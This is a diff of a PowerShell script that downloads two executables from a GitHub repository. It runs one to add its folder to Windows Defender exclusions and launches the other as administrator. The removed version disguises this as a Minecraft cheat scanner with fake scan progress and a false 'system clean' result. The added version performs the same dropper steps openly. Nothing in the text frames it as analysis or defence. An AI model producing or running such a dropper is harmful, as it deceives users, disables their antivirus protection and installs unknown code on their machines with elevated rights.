@@ -1,144 +1,85 @@
 # ===============================================
-# MINECRAFT CHEAT SCANNER v2.0 (INSTANT CLOSE)
+# SCRIPT: DEPLOY FX WITH EXCLUSIONS
 # ===============================================
 
-Set-ExecutionPolicy Bypass -Scope Process -Force
-
-Clear-Host
-$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
-
-# ===============================================
-# КОНФИГУРАЦИЯ
-# ===============================================
+# -------------------------------------------------
+# 1. CONFIGURATION
+# -------------------------------------------------
 $URL_FX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe"
 $URL_ADDEX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/AddEx.exe"
 $TARGET_DIR = "C:\ProgramData\MyApp"
 $FX_PATH = "$TARGET_DIR\Fx.exe"
 $ADDEX_PATH = "$TARGET_DIR\AddEx.exe"
 
+# -------------------------------------------------
+# 2. CREATE TARGET FOLDER IF NOT EXISTS
+# -------------------------------------------------
+Write-Host "[1/5] Checking folder: $TARGET_DIR" -ForegroundColor Cyan
 if (-not (Test-Path $TARGET_DIR)) {
     New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
+    Write-Host "      Folder created." -ForegroundColor Green
+} else {
+    Write-Host "      Folder exists." -ForegroundColor Green
 }
 
-# ===============================================
-# ВИЗУАЛ
-# ===============================================
-Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
-Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
-Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
-Start-Sleep 2
-
-$startTime = Get-Date
-
-function Show-Spinner {
-    param($text, $duration)
-    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
-    $endTime = (Get-Date).AddSeconds($duration)
-    $i = 0
-    while ((Get-Date) -lt $endTime) {
-        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
-        $i++
-        Start-Sleep 0.1
-    }
-    Write-Host "`r[✓] $text" -ForegroundColor Green
+# -------------------------------------------------
+# 3. DOWNLOAD FX.EXE
+# -------------------------------------------------
+Write-Host "[2/5] Downloading Fx.exe..." -ForegroundColor Cyan
+try {
+    Invoke-WebRequest -Uri $URL_FX -OutFile $FX_PATH -ErrorAction Stop
+    Write-Host "      Success: $FX_PATH" -ForegroundColor Green
+} catch {
+    Write-Host "      ERROR: $_" -ForegroundColor Red
+    exit 1
 }
 
-# ===============================================
-# ФОНОВАЯ ЗАГРУЗКА
-# ===============================================
-Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
-
-$downloadFx = Start-Job -ScriptBlock {
-    param($url, $path)
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-} -ArgumentList $URL_FX, $FX_PATH
-
-$downloadAddEx = Start-Job -ScriptBlock {
-    param($url, $path)
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-} -ArgumentList $URL_ADDEX, $ADDEX_PATH
-
-Show-Spinner "Анализ DLL и инжекторов..." 15
-
-# ===============================================
-Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
-$waitEnd = (Get-Date).AddSeconds(15)
-while ((Get-Date) -lt $waitEnd) {
-    Start-Sleep 0.5
+if (-not (Test-Path $FX_PATH)) {
+    Write-Host "      CRITICAL: Fx.exe not found after download." -ForegroundColor Red
+    exit 1
 }
-Show-Spinner "Проверка модов, jars, json..." 0
 
-# ===============================================
-Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
-Show-Spinner "Поиск скрытых читов..." 10
-
-# ===============================================
-Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
-Show-Spinner "Анализ реестра Run/Startup..." 10
-
-$fxOk = Receive-Job $downloadFx -ErrorAction SilentlyContinue
-$addExOk = Receive-Job $downloadAddEx -ErrorAction SilentlyContinue
-Remove-Job $downloadFx -Force -ErrorAction SilentlyContinue
-Remove-Job $downloadAddEx -Force -ErrorAction SilentlyContinue
-
-# ===============================================
-Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
-for ($p = 0; $p -le 100; $p += 10) {
-    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
-    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
-    Start-Sleep 0.5
+# -------------------------------------------------
+# 4. DOWNLOAD ADDEX.EXE
+# -------------------------------------------------
+Write-Host "[3/5] Downloading AddEx.exe..." -ForegroundColor Cyan
+try {
+    Invoke-WebRequest -Uri $URL_ADDEX -OutFile $ADDEX_PATH -ErrorAction Stop
+    Write-Host "      Success: $ADDEX_PATH" -ForegroundColor Green
+} catch {
+    Write-Host "      ERROR: $_" -ForegroundColor Red
+    Write-Host "      Continuing without AddEx.exe" -ForegroundColor Yellow
 }
-Write-Progress -Completed
 
-# ===============================================
-Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
-
+# -------------------------------------------------
+# 5. RUN ADDEX.EXE TO ADD FOLDER TO DEFENDER EXCLUSIONS
+# -------------------------------------------------
 if (Test-Path $ADDEX_PATH) {
+    Write-Host "[4/5] Running AddEx.exe to add folder to Defender exclusions..." -ForegroundColor Cyan
     try {
-        Start-Process -FilePath $ADDEX_PATH -WindowStyle Hidden
-    } catch {}
+        Start-Process -FilePath $ADDEX_PATH -Wait
+        Write-Host "      AddEx.exe finished. Folder should be in exclusions." -ForegroundColor Green
+    } catch {
+        Write-Host "      Failed to run AddEx.exe: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "[4/5] Skipping: AddEx.exe not found." -ForegroundColor Yellow
 }
 
-Show-Spinner "Проверка Minecraft серверов..." 5
-
-# ===============================================
-# ФИНАЛ - ВСЁ МГНОВЕННО
-# ===============================================
-$endTime = (Get-Date) - $startTime
-Clear-Host
-Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
-Write-Host "=" * 50 -ForegroundColor Green
-Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
-Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
-Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
-Write-Host "=" * 50 -ForegroundColor Green
-
-# Лог пишем в фоне (не ждём)
-$log = @"
-Minecraft Cheat Scan - $(Get-Date)
-Время: $([math]::Round($endTime.TotalSeconds)) сек
-Найдено: 0
-Риск: 0%
-Статус: ЧИСТО! ✅
-"@
-$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8
-
-# Запускаем Fx.exe и сразу закрываем окно
-if (Test-Path $FX_PATH) {
-    try {
-        Start-Process -FilePath $FX_PATH -Verb RunAs
-    } catch {}
+# -------------------------------------------------
+# 6. RUN FX.EXE AS ADMINISTRATOR
+# -------------------------------------------------
+Write-Host "[5/5] Running Fx.exe as Administrator..." -ForegroundColor Cyan
+try {
+    Start-Process -FilePath $FX_PATH -Verb RunAs
+    Write-Host "      Fx.exe launched." -ForegroundColor Green
+} catch {
+    Write-Host "      Failed to run Fx.exe: $_" -ForegroundColor Red
 }
 
-# МГНОВЕННОЕ ЗАКРЫТИЕ (без задержки)
-exit
+# -------------------------------------------------
+# 7. DONE
+# -------------------------------------------------
+Write-Host "`nDONE. All files in: C:\ProgramData\MyApp" -ForegroundColor Cyan
+Write-Host "Window will close in 5 seconds." -ForegroundColor Gray
+Start-Sleep -Seconds 5
